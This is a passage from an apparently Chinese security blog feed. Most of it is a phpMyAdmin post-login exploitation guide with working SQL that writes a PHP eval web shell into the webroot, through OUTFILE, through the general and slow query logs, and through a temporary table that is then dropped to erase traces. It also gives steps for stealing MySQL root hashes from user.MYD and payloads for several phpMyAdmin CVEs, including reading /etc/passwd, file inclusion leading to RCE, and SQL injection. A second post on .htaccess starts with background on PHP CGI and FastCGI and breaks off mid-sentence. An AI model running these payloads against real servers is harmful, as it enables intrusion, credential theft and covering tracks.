服务！</p></blockquote><blockquote><p>这是通用方法，在 <code>phpstudy</code> 中的 <code>mysql</code> 的配置文件中是没有这个参数的</p><p>所以我们自己在配置文件中添加一行 <code>secure_file_priv =</code> 即可。</p></blockquote><h4 id="3-2-日志读写权限"><a href="#3-2-日志读写权限" class="headerlink" title="3.2 日志读写权限"></a>3.2 日志读写权限</h4><p>查看日志状态：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables  <span class="hljs-keyword">like</span>  <span class="hljs-string">&#x27;%general%&#x27;</span>;<span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%slow%&#x27;</span>; <span class="hljs-comment">-- 慢查询日志</span></code></pre></div><p>general 开启时，所执行的 <code>sql</code> 语句都会出现在 <strong><em>*</em></strong>.log 文件。</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> general_log<span class="hljs-operator">=</span><span class="hljs-string">&#x27;on&#x27;</span></code></pre></div><p>如果将general_log_file的值换成shell路径</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> general_log_file <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span></code></pre></div><p>然后执行简单的查询</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;123&quot;]);?&gt;&#x27;</span></code></pre></div><p>即可写入shell</p><h2 id="0x02-后台写shell思路"><a href="#0x02-后台写shell思路" class="headerlink" title="0x02 后台写shell思路"></a>0x02 后台写shell思路</h2><h3 id="1-常规into-outfile-amp-into-dumpfile"><a href="#1-常规into-outfile-amp-into-dumpfile" class="headerlink" title="1. 常规into outfile&amp;into dumpfile"></a>1. 常规into outfile&amp;into dumpfile</h3><p>两者有所区别</p><blockquote><p>into outfile 主要的目的是导出 文本文件，我们在渗透过程中是用来写 shell 的<br>into dumpfile 的主要目的是导出二进制文件，在后面我们讲到 UDF 提权的过程中会经常用到这个函数生成我们的 udf.dll</p></blockquote><p>写shell主要用outfile</p><p><strong>需要条件：</strong></p><ul><li>当前的数据库用户有写权限</li><li>知道 web 绝对路径</li><li>web 路径能写</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[soap]);?&gt;&#x27;</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;C:\\phpstudy\\PHPTutorial\\WWW\\</span></code></pre></div><blockquote><p>注意，如果是在 <code>phpmyadmin</code> 的 <code>sql</code> 语句中执行写入的话，路径只能是斜杠 / 或者双反斜杠 \\</p></blockquote><p>目录不可写时可尝试其他可写的路径</p><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli"><span class="hljs-string">/upload</span><span class="hljs-string">/templates</span><span class="hljs-string">/cache</span>写入中文路径</code></pre></div><p>写入中文路径 shell</p><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> character_set_client=<span class="hljs-string">&#x27;gbk&#x27;</span>;<span class="hljs-built_in">set</span> character_set_connection=<span class="hljs-string">&#x27;gbk&#x27;</span>;<span class="hljs-built_in">set</span> character_set</code></pre></div><h3 id="2-创建表-getshell"><a href="#2-创建表-getshell" class="headerlink" title="2. 创建表 getshell"></a>2. 创建表 getshell</h3><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `mysql`.`xxxxx` (`content` TEXT <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> );<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `mysql`.`xxxxx` (`content` ) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;&lt;?php @eval($_POST[soap]);?&gt;&#x27;</span>);<span class="hljs-keyword">SELECT</span> `content` <span class="hljs-keyword">FROM</span> `mysql`.`xxxxx` <span class="hljs-keyword">INTO</span> OUTFILE <span class="hljs-string">&#x27;C:\\phpstudy\\PHPTutorial\\WWW\\test3.php&#x27;</span>;或者<span class="hljs-keyword">Create</span> <span class="hljs-keyword">TABLE</span> xxxxx (content text <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>);<span class="hljs-keyword">Insert</span> <span class="hljs-keyword">INTO</span> xxxxx (content) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27;</span>);<span class="hljs-keyword">select</span> `content` <span class="hljs-keyword">from</span> mysql.xxxxx <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;C:\\phpstudy\\PHPTutorial\\WWW\\test3.php&#x27;</span>;然后删除所建的表抹去痕迹<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `mysql`.`xxxxx`;</code></pre></div><h3 id="3-日志-getshell"><a href="#3-日志-getshell" class="headerlink" title="3. 日志 getshell"></a>3. 日志 getshell</h3><h4 id="3-1-general日志"><a href="#3-1-general日志" class="headerlink" title="3.1 general日志"></a>3.1 general日志</h4><p>查看日志状态：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables  <span class="hljs-keyword">like</span>  <span class="hljs-string">&#x27;%general%&#x27;</span>;</code></pre></div><p>general 开启时，所执行的 <code>sql</code> 语句都会出现在 <strong><em>*</em></strong>.log 文件。</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> general_log<span class="hljs-operator">=</span><span class="hljs-string">&#x27;on&#x27;</span></code></pre></div><p>如果将general_log_file的值换成shell路径</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> general_log_file <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span></code></pre></div><p>然后执行简单的查询</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;123&quot;]);?&gt;&#x27;</span></code></pre></div><p>即可写入shell</p><h4 id="3-2-慢查询写-shell"><a href="#3-2-慢查询写-shell" class="headerlink" title="3.2 慢查询写 shell"></a>3.2 慢查询写 shell</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%slow%&#x27;</span>;</code></pre></div><p>重新设置路径：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">GLOBAL</span> slow_query_log_file<span class="hljs-operator">=</span><span class="hljs-string">&#x27;C:/phpstudy/PHPTutorial/WWW/slow.php&#x27;</span>;</code></pre></div><p>开启慢查询日志：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">GLOBAL</span> slow_query_log<span class="hljs-operator">=</span><span class="hljs-keyword">on</span>;</code></pre></div><p>执行写入日志：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;soap&quot;]);?&gt;&#x27;</span> <span class="hljs-keyword">from</span> mysql.db <span class="hljs-keyword">where</span> sleep(<span class="hljs-number">10</span>);</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210321161304678.png" alt="image-20210321161304678"></p><h3 id="4-低权限读user-MYD提权"><a href="#4-低权限读user-MYD提权" class="headerlink" title="4. 低权限读user.MYD提权"></a>4. 低权限读user.MYD提权</h3><p>读user.MYD的目的是为了能够提取到root用户的hash，通过破解即可使用root用户登录，进而提权。</p><p>首先需要定位user.MYD文件路径，我们可以先查询mysql路径。</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@basedir</span>;</code></pre></div><p>user.MYD文件存储在@@basedir\data\mysql\user.MYD</p><p>依次执行</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> ttt(ddd text);load data <span class="hljs-keyword">local</span> infile <span class="hljs-string">&#x27;C:\\phpStudy\\MySQL\\data\\mysql\\user.MYD&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span> ttt fields terminated <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;&#x27;</span> LINES TERMINATED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;\0&#x27;</span>;<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> ttt;</code></pre></div><p>但是读取的不全，phpmyadmin中没法正常显示。</p><p>渗透测试场景中，如果能够导出user.MYD文件，就可以进行hash 的获取。</p><p>具体可以参考</p><p><a href="http://www.dengb.com/wzaq/1017388.html">获取MySQL中user.MYD中hash技巧</a></p><h3 id="5-UDF提权"><a href="#5-UDF提权" class="headerlink" title="5. UDF提权"></a>5. UDF提权</h3><p><strong>条件</strong>：</p><ul><li>具有写权限</li><li>插件目录可写（或者可以更改指定的插件目录）</li></ul><p>具体情况要看目标 mysql 的版本：</p><ul><li>Mysql version &gt; 5.1 时，dll 或者 so 必须位于 mysql 安装目录 libplugin 下，当对该目录具有写权限时可以利用，查看：<br><code>show variables like %plugin%;</code>// 查看插件目录</li><li>5.0 &lt;= Mysql version &lt;5.1 时，需要导出至目标服务器的系统目录，如 C://Windows/System32</li><li>Mysql version &lt; 5.0 时，目录可以自定义具体利用如下：</li></ul><p>具体流程可以参考：<a href="https://coomrade.github.io/2018/09/12/MYSQL%E5%86%99shell%E4%B8%8E%E6%8F%90%E6%9D%83/">MYSQL写shell与提权</a></p><h3 id="6-MOF-提权"><a href="#6-MOF-提权" class="headerlink" title="6. MOF 提权"></a>6. MOF 提权</h3><p>通过 <code>mysql</code> 将文件写入一个 <code>MOF</code> 文件替换掉原有的 <code>MOF</code> 文件，然后系统每隔五秒就会执行一次上传的 <code>MOF</code>。</p><p>一般适用于 <code>Windows &lt;= 2003</code>，并且 <code>C:\Windows\System32\mof</code> 目录具有写权限（一般是没有权限写）。</p><p>可以使用 <code>MSF</code> 直接利用：<code>exploit/windows/mysql/mysql_mof</code></p><h2 id="0x03-可利用漏洞"><a href="#0x03-可利用漏洞" class="headerlink" title="0x03 可利用漏洞"></a>0x03 可利用漏洞</h2><h3 id="CVE-2013-3238"><a href="#CVE-2013-3238" class="headerlink" title="CVE-2013-3238"></a>CVE-2013-3238</h3><p>影响版本：3.5.x &lt; 3.5.8.1 and 4.0.0 &lt; 4.0.0-rc3 ANYUN.ORG<br>利用模块：exploit/multi/http/phpmyadminpregreplace</p><h3 id="CVE-2012-5159"><a href="#CVE-2012-5159" class="headerlink" title="CVE-2012-5159"></a>CVE-2012-5159</h3><p>影响版本：phpMyAdmin v3.5.2.2<br>利用模块：exploit/multi/http/phpmyadmin3522_backdoor</p><h3 id="CVE-2009-1151"><a href="#CVE-2009-1151" class="headerlink" title="CVE-2009-1151"></a>CVE-2009-1151</h3><p>PhpMyAdmin配置文件/config/config.inc.php存在命令执行<br>影响版本：2.11.x &lt; 2.11.9.5 and 3.x &lt; 3.1.3.1<br>利用模块：exploit/unix/webapp/phpmyadmin_config<br>弱口令&amp;万能密码<br>弱口令：版本phpmyadmin2.11.9.2， 直接root用户登陆，无需密码</p><h3 id="低版本万能密码"><a href="#低版本万能密码" class="headerlink" title="低版本万能密码"></a>低版本万能密码</h3><p>版本2.11.3 / 2.11.4，用户名‘localhost’@‘@”则登录成功</p><h3 id="WooYun-2016-199433：任意文件读取漏洞"><a href="#WooYun-2016-199433：任意文件读取漏洞" class="headerlink" title="WooYun-2016-199433：任意文件读取漏洞"></a><code>WooYun-2016-199433</code>：任意文件读取漏洞</h3><p>影响 phpMyAdmin<code>2.x</code> 版本</p><div class="hljs code-wrapper"><pre><code class="hljs http">POST /scripts/setup.php HTTP/1.1 Host: your-ip:8080Accept-Encoding: gzip, deflate Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trid ent/5.0)Connection: closeContent-Type: application/x-www-form-urlencoded Content-Length: 80action=test&amp;configuration=O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;/etc/passwd&quot;;&#125;</code></pre></div><h3 id="CVE-2014-8959：本地文件包含"><a href="#CVE-2014-8959：本地文件包含" class="headerlink" title="CVE-2014 -8959：本地文件包含"></a>CVE-2014 -8959：本地文件包含</h3><p>影响范围：<code>phpMyAdmin 4 .0.1--4 .2.12</code>，需要 <code>PHP version &lt; 5.3.4</code></p><div class="hljs code-wrapper"><pre><code class="hljs http">/gis_data_editor.php?token=2941949d3768c57b4342d94ace606e91&amp;gis_data[gis_type]=/../../../../phpinfo.txt%00    # 注意改下token值</code></pre></div><p>在实际利用中可以利用写入文件到 <code>/tmp</code> 目录下结合此漏洞完成 <code>RCE</code>.</p><h3 id="CVE-2016-5734-：后台-RCE"><a href="#CVE-2016-5734-：后台-RCE" class="headerlink" title="CVE-2016-5734 ：后台 RCE"></a>CVE-2016-5734 ：后台 RCE</h3><p>影响范围：PhpMyAdmin<code>4 .0.x-4 .6.2</code>，需要 <code>PHP 4.3.0-5.4.6 versions</code></p><div class="hljs code-wrapper"><pre><code class="hljs python">cve-<span class="hljs-number">2016</span>-<span class="hljs-number">5734.</span>py -u root --pwd=<span class="hljs-string">&quot;&quot;</span> http://localhost/pma -c <span class="hljs-string">&quot;system(&#x27;ls -lua&#x27;);&quot;</span></code></pre></div><p>poc地址：<a href="https://www.exploit-db.com/exploits/40185">https://www.exploit-db.com/exploits/40185</a></p><h3 id="CVE-2018-12613：后台文件包含"><a href="#CVE-2018-12613：后台文件包含" class="headerlink" title="CVE-2018-12613：后台文件包含"></a>CVE-2018-12613：后台文件包含</h3><p><code>phpMyAdmin 4.8.0</code> 和 <code>4.8.1</code>，经过验证可实现任意文件包含。</p><p>漏洞验证：</p><div class="hljs code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//y</span>our-ip:<span class="hljs-number">8080</span><span class="hljs-regexp">/index.php?target=db_sql.php%253f/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd</code></pre></div><p>rce利用：包含session文件</p><p>执行 <code>SQL</code> 语句，将 <code>PHP</code> 代码写入 <code>Session</code> 文件中：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php phpinfo();exit;?&gt;&#x27;</span></code></pre></div><p>包含 <code>session</code> 文件：</p><div class="hljs code-wrapper"><pre><code class="hljs url">http:&#x2F;&#x2F;10.1.1.10&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_*** # *** 为phpMyAdmin的COOKIE值</code></pre></div><h3 id="CVE-2018-19968：任意文件包含-RCE"><a href="#CVE-2018-19968：任意文件包含-RCE" class="headerlink" title="CVE-2018-19968：任意文件包含/RCE"></a>CVE-2018-19968：任意文件包含/RCE</h3><p>phpMyAdmin 4.8.0~4.8.3，利用如下：</p><p>创建数据库，并将 <code>PHP</code> 代码写入 <code>Session</code> 文件中:</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> DATABASE foo;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> foo.bar (baz <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">PRIMARY</span> KEY );<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> foo.bar <span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span>;</code></pre></div><p>生成 <code>foo</code> 数据库的 <code>phpMyAdmin</code> 的配置表，访问：</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">10.1.1.10</span>/chk_rel.php?fixall_pmadb=<span class="hljs-number">1</span>&amp;db=foo</code></pre></div><p>篡改数据插入 <code>pma column_info</code> 中：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span>` pma__column_infoSELECT <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;foo&#x27;</span>, <span class="hljs-string">&#x27;bar&#x27;</span>, <span class="hljs-string">&#x27;baz&#x27;</span>, <span class="hljs-string">&#x27;plop&#x27;</span>,<span class="hljs-string">&#x27;plop&#x27;</span>, <span class="hljs-string">&#x27; plop&#x27;</span>, <span class="hljs-string">&#x27;plop&#x27;</span>,<span class="hljs-string">&#x27;../../../../../../../../tmp/sess_***&#x27;</span>,<span class="hljs-string">&#x27;plop&#x27;</span>; # <span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span> 为phpMyAdmin 的COOKIE值</code></pre></div><p>这里要注意不用系统的 <code>session</code> 保存位置不同，具体系统可以在 <code>phpMyAdmin</code> 登录后首页看到</p><ul><li>MacOS<code>：</code>/var/tmp</li><li>Linux<code>：</code>/var/lib/php/sessions</li><li>phpStudy<code>：</code>/phpstudy/PHPTutorial/tmp/tmp</li></ul><p>访问包含 <code>Session</code> 文件的地址：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>tbl_replace.php?db<span class="hljs-operator">=</span>foo<span class="hljs-operator">&amp;</span><span class="hljs-keyword">table</span><span class="hljs-operator">=</span>bar<span class="hljs-operator">&amp;</span>where_clause<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>fields_name[multi_edit][][]<span class="hljs-operator">=</span>baz<span class="hljs-operator">&amp;</span>clause_is_unique<span class="hljs-operator">=</span><span class="hljs-number">1</span></code></pre></div><h3 id="CVE-2020-0554-后台SQL注入"><a href="#CVE-2020-0554-后台SQL注入" class="headerlink" title="CVE-2020-0554 后台SQL注入"></a>CVE-2020-0554 后台SQL注入</h3><p>报错注入</p><div class="hljs code-wrapper"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.209</span><span class="hljs-number">.139</span>:<span class="hljs-number">8001</span><span class="hljs-operator">/</span>server_privileges.php?ajax_request<span class="hljs-operator">=</span><span class="hljs-literal">true</span><span class="hljs-operator">&amp;</span>validate_username<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>username<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-keyword">and</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>))<span class="hljs-comment">--+db=&amp;token=c2064a8c5f437da931fa01de5aec6581&amp;viewing_mode=server</span></code></pre></div><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><p><a href="https://xxxxx.com/sec/496.html#menu_index_3">phpmyadmin 后台 getshell 及漏洞利用</a></p></li><li><p><a href="https://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/#1-win-%E4%B8%8B%E5%B8%B8%E8%A7%81%E7%9A%84%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%EF%BC%9A">Mysql 在渗透测试中的利用</a></p></li><li><p><a href="https://blog.csdn.net/weixin_43940853/article/details/104527925">利用phpmyadmin getshell(非实战，在本地环境下进行)</a></p></li><li><p><a href="http://www.dengb.com/wzaq/1017388.html">获取MySQL中user.MYD中hash技巧</a></p></li><li><p><a href="https://github.com/vulhub/vulhub">vulhub</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/138266875">phpMyAdmin后台SQL注入(CVE-2020-0554)</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;phpmyadmin-后台-getshell-及漏洞利用思路整理&quot;&gt;&lt;a href=&quot;#phpmyadmin-后台-getshell-及漏洞利用思路整理&quot; class=&quot;headerlink&quot; title=&quot;phpmyadmin 后台 getshell 及漏洞利用</summary>
      
    
    
    
    <category term="web安全" scheme="https://greydr34d.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="phpmyadmin" scheme="https://greydr34d.github.io/categories/web%E5%AE%89%E5%85%A8/phpmyadmin/"/>
    
    
    <category term="web安全" scheme="https://greydr34d.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="phpmyadmin" scheme="https://greydr34d.github.io/tags/phpmyadmin/"/>
    
    <category term="getshell" scheme="https://greydr34d.github.io/tags/getshell/"/>
    
  </entry>
  
  <entry>
    <title>php .htaccess利用</title>
    <link href="https://greydr34d.github.io/2020/10/30/php-htaccess%E5%88%A9%E7%94%A8/"/>
    <id>https://greydr34d.github.io/2020/10/30/php-htaccess%E5%88%A9%E7%94%A8/</id>
    <published>2020-10-30T03:05:43.000Z</published>
    <updated>2021-03-13T15:50:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php-htaccess利用"><a href="#php-htaccess利用" class="headerlink" title="php .htaccess利用"></a>php .htaccess利用</h1><h2 id="0x01-php-fpm、fastcgi、cgi之间的关系"><a href="#0x01-php-fpm、fastcgi、cgi之间的关系" class="headerlink" title="0x01 php-fpm、fastcgi、cgi之间的关系"></a>0x01 php-fpm、fastcgi、cgi之间的关系</h2><p>转载于：<a href="https://www.awaimai.com/371.html">https://www.awaimai.com/371.html</a></p><p>在整个网站架构中，Web Server（如Apache）只是内容的分发者。举个栗子，如果客户端请求的是 index.html，那么Web Server会去文件系统中找到这个文件，发送给浏览器，这里分发的是静态数据。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/html.png" alt="img"></p><p>如果请求的是 index.php，根据配置文件，Web Server知道这个不是静态文件，需要去找 PHP 解析器来处理，那么他会把这个请求简单处理，然后交给PHP解析器。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/cgi.png" alt="img"></p><p>当Web Server收到 index.php 这个请求后，会启动对应的 CGI 程序，这里就是PHP的解析器。接下来<strong>PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。</strong>这就是一个完整的动态PHP Web访问流程，接下来再引出这些概念，就好理解多了，</p><ul><li><strong>CGI：</strong>是 Web Server 与 Web Application 之间数据交换的一种协议。</li><li><strong>FastCGI：</strong>同 CGI，是一种通信协议，但比 CGI 在效率上做了一些优化。同样，SCGI 协议与 FastCGI 类似。</li><li><strong>PHP-CGI：</strong>是 PHP （Web Application）对 Web Server 提供的 CGI 协议的接口程序。</li><li><strong>PHP-FPM：</strong>是 PHP（Web Application）对 Web Server 提供的 FastCGI 协议的接口程序，额外还提供了相对智能一些任务管理。</li></ul><h2 id="0x02-Apache调用解析器的三种方式"><a href="#0x02-Apache调用解析器的三种方式" class="headerlink" title="0x02 Apache调用解析器的三种方式"></a>0x02 Apache调用解析器的三种方式</h2><p>参考：<a href="https://www.freebuf.com/vuls/218495.html">https://www.freebuf.com/vuls/218495.html</a></p><p>第一种是最通用最常见的<strong>Module方式</strong>，即在httpd.conf中使用LoadModule的方式，将php的dll或者so文件加载到apache当中。</p><p>还有两种是<strong>CGI方式</strong>和<strong>FastCGI方式</strong>。其实后者用的越来越广泛了。一般PHP-FPM也是与FastCGI进行配合使用的。</p><h4 id="Module方式"><a href="#Module方式" class="headerlink" title="Module方式"></a>Module方式</h4><p>以 Apache 为例，在PHP Module方式中，是不是在 Apache 的配置文件 httpd.conf 中加上这样几句：</p><div class="hljs code-wrapper"><pre><code class="hljs xml"># 加入以下2句LoadModule php5_module D:/php/php5apache2_2.dllAddType application/x-httpd-php .php# 修改如下内容<span class="hljs-tag">&lt;<span class="hljs-name">IfModule</span> <span class="hljs-attr">dir_module</span>&gt;</span>    DirectoryIndex index.php index.html<span class="hljs-tag">&lt;/<span class="hljs-name">IfModule</span>&gt;</span></code></pre></div><p>上面是 Windows 下安装php和apache环境后手动配置，在linux下源码安装大致是这样配置的：</p><div class="hljs code-wrapper"><pre><code class="hljs gradle"># .<span class="hljs-regexp">/configure --with-mysql=/u</span>sr<span class="hljs-regexp">/local --with-apache=/u</span>sr<span class="hljs-regexp">/local/</span>apache --enable-track-vars</code></pre></div><p>所以，这种方式，他们的共同本质都是用 LoadModule 来加载 php5_module，就是<strong>把php作为apache的一个子模块来运行</strong>。当通过web访问php文件时，apache就会调用php5_module来解析php代码。</p><p>php5_module是怎么来将数据传给php解析器来解析php代码的呢？答案是通过<strong>sapi</strong>。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1417244404_9526.png" alt="mode_php"></p><p>所以，以上的apache调用php执行的过程如下：</p><div class="hljs code-wrapper"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">apache</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">httpd</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">php5_module</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">sapi</span> -&gt;</span> php</code></pre></div><h4 id="CGI方式"><a href="#CGI方式" class="headerlink" title="CGI方式"></a>CGI方式</h4><p>CGI（<strong>Common Gateway Interface</strong>）全称是“<strong>通用网关接口</strong>”，WEB 服务器与PHP应用进行“交谈”的一种工具，其程序须运行在网络服务器上。CGI可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。如php、perl、tcl等。</p><p>WEB服务器会传哪些数据给PHP解析器呢？<strong>URL、查询字符串、POST数据、HTTP header</strong>都会有。所以，CGI就是规定要传哪些数据，以什么样的格式传递给后方处理这个请求的协议。仔细想想，你在PHP代码中使用的用户从哪里来的。</p><p>也就是说，CGI就是专门用来和 web 服务器打交道的。web服务器收到用户请求，就会把请求提交给cgi程序（如php-cgi），cgi程序根据请求提交的参数作应处理（解析php），然后输出标准的html语句，返回给web服服务器，WEB服务器再返回给客户端，这就是普通cgi的工作原理。</p><p>CGI的好处就是完全独立于任何服务器，仅仅是做为中间分子。提供接口给apache和php。他们通过cgi搭线来完成数据传递。这样做的好处了尽量减少2个的关联，使他们2变得更独立。</p><p>但是CGI有个蛋疼的地方，就是每一次web请求都会有启动和退出过程，也就是最为人诟病的<strong>fork-and-execute</strong>模式，这样一在大规模并发下，就死翘翘了。</p><h4 id="FastCGI方式"><a href="#FastCGI方式" class="headerlink" title="FastCGI方式"></a>FastCGI方式</h4><p>从根本上来说，FastCGI是用来提高CGI程序性能的。类似于CGI，<strong>FastCGI也可以说是一种协议</strong>。</p><p>FastCGI像是一个<strong>常驻(long-live)型的CGI</strong>，它可以一直执行着，只要激活后，不会每次都要花费时间去fork一次。它还支持分布式的运算, 即 FastCGI 程序可以在网站服务器以外的主机上执行，并且接受来自其它网站服务器来的请求。</p><p>FastCGI是语言无关的、可伸缩架构的CGI开放扩展，其主要行为是将CGI解释器进程保持在内存中，并因此获得较高的性能。众所周知，CGI解释器的反复加载是CGI性能低下的主要原因，如果CGI解释器保持在内存中，并接受FastCGI进程管理器调度，则可以提供良好的性能、伸缩性、Fail- Over特性等等。</p><h5 id="FastCGI的工作原理"><a href="#FastCGI的工作原理" class="headerlink" title="FastCGI的工作原理"></a>FastCGI的工作原理</h5><p>FastCGI接口方式采用C/S结构，可以将HTTP服务器和脚本解析服务器分开，同时在脚本解析服务器上启动一个或者<strong>多个脚本解析守护进程</strong>。当HTTP服务器每次遇到动态程序时，可以将其直接交付给FastCGI进程来执行，然后将得到的结果返回给浏览器。这种方式可以让HTTP服务器专一地处理静态请求，或者将动态脚本服务器的结果返回给客户端，这在很大程度上提高了整个应用系统的性能。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/fastcgi.png" alt="fastcgi"></p><ol><li>Web Server启动时载入FastCGI进程管理器（Apache Module或IIS ISAPI等)</li><li>FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可建多个php-cgi)，并等待来自Web Server的连接。</li><li>当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。</li><li>FastCGI子进程完成处理后，将标准输出和错误信息从同一连接返回Web  Server。当FastCGI子进程关闭连接时，请求便告处理完成。<strong>FastCGI子进程接着等待，并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。 在CGI模式中，php-cgi在此便退出了。</strong></li></ol><p>FastCGI与CGI特点：</p><ol><li><p><strong>对于CGI来说，每一个Web请求PHP都必须重新解析php.ini、重新载入全部扩展，并重新初始化全部数据结构。而使用FastCGI，所有这些都只在进程启动时发生一次。</strong>一个额外的好处是，持续数据库连接(Persistent database 